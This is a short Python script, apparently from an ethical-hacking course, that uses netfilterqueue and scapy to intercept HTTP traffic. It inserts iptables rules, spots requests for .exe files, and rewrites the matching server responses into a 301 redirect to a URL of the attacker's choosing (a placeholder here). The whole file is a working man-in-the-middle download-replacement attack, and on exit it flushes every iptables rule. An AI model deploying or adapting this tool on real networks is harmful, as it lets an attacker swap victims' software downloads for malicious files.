#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy

##subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 8",shell=True)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 8",shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 8",shell=True)
ack_list = []
def process(packet):
    ## get payload te da informacion del paquete
    scapy_packet =scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print ("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print ("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            print ("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print ("[+] Replacing files")
                ##se crea la nueva respuesta
                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))

    packet.accept()
x = netfilterqueue.NetfilterQueue()
## conect the queue 8 to the function we want to execute
x.bind(8, process)


try:

        x.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("[+] se ha interrumpido la conexion")